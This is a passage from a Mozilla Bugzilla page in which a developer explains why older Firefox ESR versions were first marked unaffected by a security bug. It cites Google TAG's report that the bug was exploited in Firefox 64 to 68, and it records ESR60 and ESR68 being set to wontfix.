We never established a "regressor" because this was more of a hardening effort than a vulnerability fix when it started. Without knowing the regressor, marking old versions as "unaffected" was premature. If we had known then what we know now we would have pushed to take it on the ESR, but at the time it was not filed as a severe vulnerability and ESR patching is conservative.

According to [analysis from the Google TAG](https://blog.google/threat-analysis-group/new-details-on-commercial-spyware-vendor-variston/) (see the "Heliconia Files" section) this was exploited in versions Fx64-Fx68 at least.

[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[unaffected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=unaffected) → [?](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=%3F)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[unaffected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=unaffected) → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a128157984_75935)• 2 years ago |

[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix)
You need to [log in](/show_bug.cgi?id=1530709&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Frederik Braun [:freddy]](/user_profile?user_id=428608)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


